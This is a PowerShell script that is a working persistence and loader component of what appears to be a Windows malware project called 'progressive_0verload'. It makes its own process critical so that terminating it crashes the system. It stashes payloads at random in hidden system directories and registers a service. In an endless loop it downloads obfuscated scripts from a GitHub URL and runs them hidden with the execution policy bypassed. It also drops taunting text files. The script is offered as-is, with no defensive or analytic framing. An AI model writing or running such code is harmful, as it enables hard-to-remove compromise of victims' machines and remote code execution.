param(
    [string]$basePath,
    [string]$exe
)

Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami_fwd.txt`""
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642"
)
$b = $basePath -replace '([\\{}])', '`$1'

$serviceName = "MyfwdService"
$propertyName = "fwd"
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
$fwdName = "f.ps1"

$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
$issetup = $false

if(-not($item)){
    $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $fwdPath = "$fwdPath\$fwdName"
    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
    $issetup = $true
}

else{
    $fwdPath = $item.$propertyName
    $issetup = $false
}



function Get-ServiceReg{
    param([string]$path)

    $r = Get-Item -Path $path -ErrorAction SilentlyContinue

    if(-not($r)){
        return $true
    }
    return $false
}



function Get-ServiceName{
    param([string]$name)

    try {
        $s = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($s)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}




while ($true) {
    $x = Get-ServiceReg -path $regPath
    $y = Get-ServiceName -name $serviceName
    if((Test-Path -Path "$env:temp\_ready.lock" -PathType Leaf) -and (Test-Path -Path "$env:temp\jMEmdVuJAtNea.txt" -PathType Leaf)){
        $fwdName = Get-Content -Path "$env:temp\jMEmdVuJAtNea.txt"
        $fwdName = $fwdName.Trim()
        if($null -ne $fwdName -and $fwdName -ne ""){
            $it = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
            if($it){
                $fwdPath = $it.$propertyName
            }
            $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
            $arg = "-ep bypass -nop -w hidden $fwdPath"
            & $exe set "MyfwdService" AppParameters $arg
            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
            Remove-Item -Path "$env:temp\_ready.lock" -Force
            Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
            echo "GET LAID WINDOWS DF XD" >> "C:\LAID.txt"
        }
    }
    if(-not(Test-Path -Path $fwdPath -PathType Leaf)){
        if(-not($issetup)){
            $initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
            $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $fwdPath = "$fwdPath\$fwdName"
            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
        }
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
    }

    elseif($x -or $y){
        $initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
    }
    $issetup = $false
}